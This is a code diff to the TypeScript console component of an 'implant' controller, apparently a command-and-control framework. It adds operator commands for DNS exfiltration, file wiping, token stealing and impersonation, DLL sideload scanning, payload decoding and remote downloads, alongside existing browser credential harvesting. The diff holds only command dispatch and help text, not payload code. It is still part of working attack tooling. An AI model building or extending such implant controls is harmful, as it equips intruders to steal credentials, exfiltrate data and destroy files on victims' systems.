@@ -153,6 +153,16 @@ export const Console = ({ implantId }: ConsoleProps) => {
             terminal.writeln('  browser          - Harvest browser creds');
             terminal.writeln('  netscan <target> - Network scan');
             terminal.writeln('  stopsvc <name>   - Stop service');
+            terminal.writeln('  compress <hex>   - Compress data (DEFLATE)');
+            terminal.writeln('  exfildns <hex> <dom> - Exfil via DNS');
+            terminal.writeln('  wipe <path>      - Secure delete file');
+            terminal.writeln('  hijack <ms>      - Hijack resource loop');
+            terminal.writeln('  stealtoken <pid> - Impersonate token');
+            terminal.writeln('  reverttoken      - Revert impersonation');
+            terminal.writeln('  decodexor <hex> <k> - XOR decode');
+            terminal.writeln('  decodeb64 <b64>  - Base64 decode');
+            terminal.writeln('  sideload         - Scan for DLL sideloads');
+            terminal.writeln('  download <url>   - Download file (HTTP)');
             terminal.writeln('  cancel           - Cancel last running command');
           } else if (trimmed === 'cancel') {
             if (lastCommandIdRef.current) {
@@ -209,6 +219,16 @@ export const Console = ({ implantId }: ConsoleProps) => {
                 case 'browser': type = 'browser'; payload = ''; break;
                 case 'netscan': type = 'net_scan'; payload = args; break;
                 case 'stopsvc': type = 'service_stop'; payload = args; break;
+                case 'compress': type = 'compress'; payload = args; break;
+                case 'exfildns': type = 'exfil_dns'; payload = args; break;
+                case 'wipe': type = 'wipe'; payload = args; break;
+                case 'hijack': type = 'hijack'; payload = args; break;
+                case 'stealtoken': type = 'steal_token'; payload = args; break;
+                case 'reverttoken': type = 'revert_token'; payload = ''; break;
+                case 'decodexor': type = 'decode_xor'; payload = args; break;
+                case 'decodeb64': type = 'decode_base64'; payload = args; break;
+                case 'sideload': type = 'sideload_scan'; payload = ''; break;
+                case 'download': type = 'download'; payload = args; break;
                 default:
                     type = 'shell'; payload = trimmed;
             }
